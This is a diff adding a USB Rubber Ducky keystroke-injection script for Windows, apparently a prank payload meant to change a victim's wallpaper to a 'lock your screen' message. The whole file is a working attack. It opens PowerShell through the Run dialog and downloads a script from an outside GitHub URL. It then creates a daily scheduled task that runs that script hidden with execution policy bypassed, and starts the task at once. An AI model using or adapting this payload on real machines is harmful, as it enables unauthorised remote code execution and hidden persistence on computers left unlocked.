@@ -1,0 +1,20 @@
+DELAY 1000
+GUI r
+DELAY 100
+STRING powershell
+ENTER
+DELAY 500
+STRING (New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/4d4c/wall_ducky/master/change_wallpaper.ps1", "C:\Users\Public\Pictures\LockYourScreen.ps1")
+ENTER
+DELAY 2000
+
+
+STRING cmd.exe
+ENTER
+DELAY 500
+STRING schtasks /create /tn "PleaseLockYourScreen" /SC DAILY /st 09:00:00 /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command '& C:\Users\Public\Pictures\LockYourScreen.ps1'"
+ENTER
+STRING schtasks /Run /TN "PleaseLockYourScreen"
+ENTER
+STRING exit
+ENTER
